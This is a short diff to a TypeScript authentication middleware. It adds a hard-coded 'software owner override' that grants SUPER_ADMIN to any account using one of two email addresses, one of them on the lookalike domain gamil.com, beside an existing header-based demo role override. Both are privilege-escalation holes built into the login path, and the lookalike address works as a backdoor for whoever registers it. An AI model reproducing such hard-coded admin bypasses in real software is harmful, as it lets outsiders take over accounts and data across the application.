@@ -121,6 +121,15 @@ export const authenticate = async (req: AuthRequest, res: Response, next: NextFu
         
         const requestedDemoRole = req.headers['x-demo-role'] as string;
         let roleCode = userRole?.code || 'PROPERTY_MANAGER';
+
+        // SOFTWARE OWNER OVERRIDE: Make the founder always a Super Admin
+        if (dbUser.email === 'aylewma@gamil.com' || dbUser.email === 'aylewma@gmail.com') {
+          roleCode = 'SUPER_ADMIN';
+          const superAdminRole = (await db.select().from(roles).where(eq(roles.code, 'SUPER_ADMIN')))[0];
+          if (superAdminRole) {
+            userRole = superAdminRole;
+          }
+        }
         
         // ALLOW DEMO ROLE OVERRIDE FOR PORTFOLIO/TESTING (Only overrides role, NOT organization)
         if (requestedDemoRole) {
